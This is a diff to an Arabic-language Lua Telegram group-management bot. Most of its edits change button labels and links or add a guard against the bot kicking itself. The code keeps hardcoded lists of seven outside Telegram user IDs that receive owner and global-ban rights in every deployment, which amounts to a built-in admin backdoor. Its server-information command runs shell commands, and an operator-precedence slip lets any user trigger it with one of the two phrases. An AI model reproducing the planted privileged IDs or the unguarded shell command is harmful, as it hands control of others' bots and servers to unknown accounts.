@@ -137,7 +137,7 @@ sudos = dofile("./info.lua")
 SUDO = tonumber(sudos.SUDO)
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
-sudo_users = {SUDO,1859346570,1554085475,944353237,1261853045,1787429259,1947285101,1600370037}
+sudo_users = {1859346570,1554085475,944353237,1261853045,1787429259,1947285101,1600370037}
 banall_users = {1859346570,1554085475,944353237,1261853045,1787429259,1947285101,1600370037}
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
@@ -157,6 +157,9 @@ function SudoBot(msg)
 local AVIRA = false  
 for k,v in pairs(sudo_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
+AVIRA = true  
+end  
+if tonumber(msg.sender_user_id_) == tonumber(SUDO) then  
 AVIRA = true  
 end  
 end  
@@ -397,12 +400,13 @@ end
 return chat
 end
 function chat_kick(chat,user)
+if user ~= bot_id then
 tdcli_function ({
 ID = "ChangeChatMemberStatus",
 chat_id_ = chat,
 user_id_ = user,
 status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
-end
+end end
 function send(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
 tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
@@ -899,9 +903,9 @@ Namebot = (database:get(bot_id..'Name:Bot') or 'كلاسيك')
 agwa = dofile("./info.lua").UserName
  agwa = agwa:gsub("%@", "")
 local inline = {
-{{text = '  مطور البوت 𖠕 ',url="t.me/"..agwa}},
+{{text = 'مطور البوت 𖠕 ',url="t.me/"..agwa}},
 {{text = 'اضف البوت الي مجموعتك 𖠕' ,url="t.me/"..dofile("./info.lua").botUserName.."?startgroup=start"}}, 
-{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/XXx_cLASsIC_xXX"}},
+{{text = '⌯ 𝐒𝐎𝐔𝐑𝐂𝐄 ⊁', url="t.me/XXx_cLASsIC_xXX"}},
 } 
 local Keyboard = {
 {'𝐒𝐎𝐔𝐑𝐂𝐄 𝐂𝐋𝐀𝐒𝐒𝐈𝐊'},
@@ -2751,7 +2755,7 @@ end,nil)
 end
 
 
-if text == 'معلومات السيرفر' or text == 'السيرفر' and sudobot(msg) then 
+if text == 'معلومات السيرفر' or text == 'السيرفر' and SudoBot(msg) then 
 send(msg.chat_id_, msg.id_, io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
@@ -3103,9 +3107,9 @@ local Text =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ⌯ 𝐒𝐎𝐔𝐑𝐂𝐄 ⊁  ',url="t.me/XXx_cLASsIC_xXX"}},
-{{text = ' ⌯ 𝐃𝐄𝐕 ⊁ ',url="t.me/Boyka_23"}},
-{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..dofile("./info.lua").botUserName.."?startgroup=new"}},
+{{text = '⌯ 𝐒𝐎𝐔𝐑𝐂𝐄 ⊁',url="t.me/XXx_cLASsIC_xXX"}},
+{{text = '⌯ 𝐃𝐄𝐕 ⊁',url="t.me/Boyka_23"}},
+{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..dofile("./info.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/F_R_M1/407&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -3118,8 +3122,8 @@ local Text = [[
 ]]  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text = '   ⌯ 𝐁𝐎𝐘𝐊𝐀² ⊁  ',url="t.me/Dev_Boyka"}},
-{{text = '  ⌯ 𝐒𝐀𝐒𝐀 ⊁ ',url="t.me/S_A_S_A_1"}},
+{{text = '⌯ 𝐁𝐎𝐘𝐊𝐀² ⊁',url="t.me/Dev_Boyka"}},
+{{text = '⌯ 𝐒𝐀𝐒𝐀 ⊁',url="t.me/S_A_S_A_1"}},
 {{text = '00:00',url="t.me/XXx_cLASsIC_xXX"}},  
 
 }  
